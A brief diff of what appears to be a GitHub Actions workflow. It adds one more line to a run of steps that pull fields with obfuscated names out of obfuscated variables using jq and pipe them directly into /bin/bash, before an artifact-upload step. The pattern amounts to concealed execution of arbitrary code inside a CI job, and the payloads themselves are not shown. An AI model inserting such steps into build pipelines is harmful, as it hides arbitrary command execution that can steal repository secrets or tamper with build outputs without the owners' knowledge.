@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$yy43300" | jq -r .bm3 | /bin/bash
           echo $u336 | jq -r .hsjqj8 | /bin/bash
           echo $azf6 | jq -r .zuazl48229 | /bin/bash
+          echo $mo02 | jq -r .abcwf6954 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
